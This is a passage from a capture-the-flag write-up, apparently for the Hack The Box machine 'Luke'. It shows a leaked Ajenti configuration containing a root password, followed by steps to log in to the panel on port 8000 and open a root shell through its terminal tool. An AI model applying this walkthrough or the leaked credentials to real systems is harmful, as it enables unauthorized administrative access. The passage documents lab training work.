+                </span><span class="nl">"ajenti.plugins.dashboard.dash.Dash"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{</span><span class="se">\"</span><span class="s2">widgets</span><span class="se">\"</span><span class="s2">: [{</span><span class="se">\"</span><span class="s2">index</span><span class="se">\"</span><span class="s2">: 0, </span><span class="se">\"</span><span class="s2">config</span><span class="se">\"</span><span class="s2">: null, </span><span class="se">\"</span><span class="s2">container</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">1</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">class</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">ajenti.plugins.sensors.memory.MemoryWidget</span><span class="se">\"</span><span class="s2">}, {</span><span class="se">\"</span><span class="s2">index</span><span class="se">\"</span><span class="s2">: 1, </span><span class="se">\"</span><span class="s2">config</span><span class="se">\"</span><span class="s2">: null, </span><span class="se">\"</span><span class="s2">container</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">1</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">class</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">ajenti.plugins.sensors.memory.SwapWidget</span><span class="se">\"</span><span class="s2">}, {</span><span class="se">\"</span><span class="s2">index</span><span class="se">\"</span><span class="s2">: 2, </span><span class="se">\"</span><span class="s2">config</span><span class="se">\"</span><span class="s2">: null, </span><span class="se">\"</span><span class="s2">container</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">1</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">class</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">ajenti.plugins.dashboard.welcome.WelcomeWidget</span><span class="se">\"</span><span class="s2">}, {</span><span class="se">\"</span><span class="s2">index</span><span class="se">\"</span><span class="s2">: 0, </span><span class="se">\"</span><span class="s2">config</span><span class="se">\"</span><span class="s2">: null, </span><span class="se">\"</span><span class="s2">container</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">0</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">class</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">ajenti.plugins.sensors.uptime.UptimeWidget</span><span class="se">\"</span><span class="s2">}, {</span><span class="se">\"</span><span class="s2">index</span><span class="se">\"</span><span class="s2">: 1, </span><span class="se">\"</span><span class="s2">config</span><span class="se">\"</span><span class="s2">: null, </span><span class="se">\"</span><span class="s2">container</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">0</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">class</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">ajenti.plugins.power.power.PowerWidget</span><span class="se">\"</span><span class="s2">}, {</span><span class="se">\"</span><span class="s2">index</span><span class="se">\"</span><span class="s2">: 2, </span><span class="se">\"</span><span class="s2">config</span><span class="se">\"</span><span class="s2">: null, </span><span class="se">\"</span><span class="s2">container</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">0</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">class</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">ajenti.plugins.sensors.cpu.CPUWidget</span><span class="se">\"</span><span class="s2">}]}"</span><span class="p">,</span><span class="w"> 
+                </span><span class="nl">"ajenti.plugins.elements.shaper.main.Shaper"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{</span><span class="se">\"</span><span class="s2">rules</span><span class="se">\"</span><span class="s2">: []}"</span><span class="p">,</span><span class="w"> 
+                </span><span class="nl">"ajenti.plugins.ajenti_org.main.AjentiOrgReporter"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{</span><span class="se">\"</span><span class="s2">key</span><span class="se">\"</span><span class="s2">: null}"</span><span class="p">,</span><span class="w"> 
+                </span><span class="nl">"ajenti.plugins.logs.main.Logs"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{</span><span class="se">\"</span><span class="s2">root</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">/var/log</span><span class="se">\"</span><span class="s2">}"</span><span class="p">,</span><span class="w"> 
+                </span><span class="nl">"ajenti.plugins.mysql.api.MySQLDB"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{</span><span class="se">\"</span><span class="s2">password</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">user</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">root</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">hostname</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">localhost</span><span class="se">\"</span><span class="s2">}"</span><span class="p">,</span><span class="w"> 
+                </span><span class="nl">"ajenti.plugins.fm.fm.FileManager"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{</span><span class="se">\"</span><span class="s2">root</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">/</span><span class="se">\"</span><span class="s2">}"</span><span class="p">,</span><span class="w"> 
+                </span><span class="nl">"ajenti.plugins.tasks.manager.TaskManager"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{</span><span class="se">\"</span><span class="s2">task_definitions</span><span class="se">\"</span><span class="s2">: []}"</span><span class="p">,</span><span class="w"> 
+                </span><span class="nl">"ajenti.users.UserManager"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{</span><span class="se">\"</span><span class="s2">sync-provider</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"\"</span><span class="s2">}"</span><span class="p">,</span><span class="w"> 
+                </span><span class="nl">"ajenti.usersync.adsync.ActiveDirectorySyncProvider"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{</span><span class="se">\"</span><span class="s2">domain</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">DOMAIN</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">password</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">user</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">Administrator</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">base</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">cn=Users,dc=DOMAIN</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">address</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">localhost</span><span class="se">\"</span><span class="s2">}"</span><span class="p">,</span><span class="w"> 
+                </span><span class="nl">"ajenti.plugins.elements.usermgr.ElementsUserManager"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{</span><span class="se">\"</span><span class="s2">groups</span><span class="se">\"</span><span class="s2">: []}"</span><span class="p">,</span><span class="w"> 
+                </span><span class="nl">"ajenti.plugins.elements.projects.main.ElementsProjectManager"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{</span><span class="se">\"</span><span class="s2">projects</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">KGxwMQou</span><span class="se">\\</span><span class="s2">n</span><span class="se">\"</span><span class="s2">}"</span><span class="w">
+            </span><span class="p">},</span><span class="w"> 
+            </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"KpMasng6S5EtTy9Z"</span><span class="p">,</span><span class="w"> 
+            </span><span class="nl">"permissions"</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">},</span><span class="w"> 
+    </span><span class="nl">"language"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w"> 
+    </span><span class="nl">"bind"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"host"</span><span class="p">:</span><span class="w"> </span><span class="s2">"0.0.0.0"</span><span class="p">,</span><span class="w"> 
+        </span><span class="nl">"port"</span><span class="p">:</span><span class="w"> </span><span class="mi">8000</span><span class="w">
+    </span><span class="p">},</span><span class="w"> 
+    </span><span class="nl">"enable_feedback"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> 
+    </span><span class="nl">"ssl"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"enable"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> 
+        </span><span class="nl">"certificate_path"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="w">
+    </span><span class="p">},</span><span class="w"> 
+    </span><span class="nl">"authentication"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> 
+    </span><span class="nl">"installation_id"</span><span class="p">:</span><span class="w"> </span><span class="mi">12354</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div>        </div>
+        <p><strong>NOTE(S)</strong>:</p>
+        <ol>
+          <li>The config file contains credentials for a user, <code class="highlighter-rouge">root</code> (PASSWORD: <code class="highlighter-rouge">KpMasng6S5EtTy9Z</code>)</li>
+          <li>The root directory for the Ajenti Service is <code class="highlighter-rouge">/</code>:
+            <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">"ajenti.plugins.fm.fm.FileManager"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{</span><span class="se">\"</span><span class="s2">root</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">/</span><span class="se">\"</span><span class="s2">}"</span><span class="w">
+</span></code></pre></div>            </div>
+          </li>
+          <li>A terminal plugin seems to be integrated to the service:
+            <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">"ajenti.plugins.terminal.main.Terminals"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{</span><span class="se">\"</span><span class="s2">shell</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">sh -c $SHELL || sh</span><span class="se">\"</span><span class="s2">}"</span><span class="w">
+</span></code></pre></div>            </div>
+          </li>
+        </ol>
+      </li>
+    </ol>
+  </li>
+  <li>Login to the Ajenti service at port 8000:
+    <ul>
+      <li>
+        <p>Landing page (<strong><em>Dashboard</em></strong>):</p>
+
+        <p><img src="./screenshots/28_luke/8000_dashboard.png" alt="http://10.10.10.137:8000" /></p>
+      </li>
+      <li>
+        <p><strong><em>TOOLS</em></strong> &gt; <strong><em>File Manager</em></strong>:</p>
+
+        <p><img src="./screenshots/28_luke/8000_file_manager.png" alt="http://10.10.10.137:8000" /></p>
+
+        <p><strong>NOTE(S)</strong>:</p>
+        <ol>
+          <li>The <code class="highlighter-rouge">/root</code> directory is already accessible using the <em>File Manager</em> tool in Ajenti.</li>
+        </ol>
+      </li>
+    </ul>
+  </li>
+</ol>
+
+<hr />
+
+<h2 id="part-4--generate-a-root-shell">PART 4 : GENERATE A ROOT SHELL</h2>
+
+<ol>
+  <li>
+    <p>Create an active terminal using <strong><em>TOOLS</em></strong> &gt; <strong><em>Terminal</em></strong>:</p>
+
+    <p><img src="./screenshots/28_luke/8000_terminal.png" alt="http://10.10.10.137:8000" /></p>
+  </li>
+  <li>
+    <p>Run the created terminal:</p>
+
+    <p><img src="./screenshots/28_luke/8000_shell.png" alt="http://10.10.10.137:8000" /></p>
+  </li>
+</ol>
+
+      </section>
+    </div>
+
+    
+      <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'true', 'auto');
+        ga('send', 'pageview');
+      </script>
+    
+  </body>
+</html>
